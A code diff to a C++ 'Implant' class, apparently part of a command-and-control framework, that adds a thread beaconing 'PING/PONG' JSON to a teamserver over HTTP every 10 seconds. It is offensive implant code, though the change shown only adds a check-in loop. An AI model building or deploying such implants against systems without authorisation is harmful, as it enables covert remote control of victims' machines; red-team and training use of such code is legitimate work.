@@ -203,7 +203,23 @@ void Implant::beaconCheckIn(const char* url) {
     boost::property_tree::write_json(resultsStringStream,resultsLocal);
     sendHttpRequest(host,port, url, resultsStringStream.str());
 }
+// Method to ping teamserver every 10 seconds
+void Implant::Pinger() {
+    // Local results variable and root for our ptree
+    boost::property_tree::ptree resultsLocal;
+    // Our results string that we will send to the server
+    std::stringstream resultsStringStream;
 
+    // Adding our results to the root ptree for json format
+    resultsLocal.put("PING", "PONG");
+    // Parsing to json format
+    boost::property_tree::write_json(resultsStringStream, resultsLocal);
+
+    while (isRunning) { //While loop for ping every 10 seconds
+        sendHttpRequest(host, port, "/ping", resultsStringStream.str());
+        std::this_thread::sleep_for(std::chrono::seconds{ 10 });
+    }
+}
 
 // Method to set the mean dwell time on our implant
 void Implant::setMeanDwell(double meanDwell) {
@@ -312,5 +328,7 @@ Implant::Implant(std::string host, std::string port, std::string uri) :
     isRunning{ true },
     dwellDistributionSeconds{ 0.4 },
     // Thread that runs all our tasks, performs asynchronous I/O
-    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
-}
+    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) },
+    // Thread that runs our pinger
+    pingerThread{ std::async(std::launch::async, [this] { Pinger(); }) } {
+} 
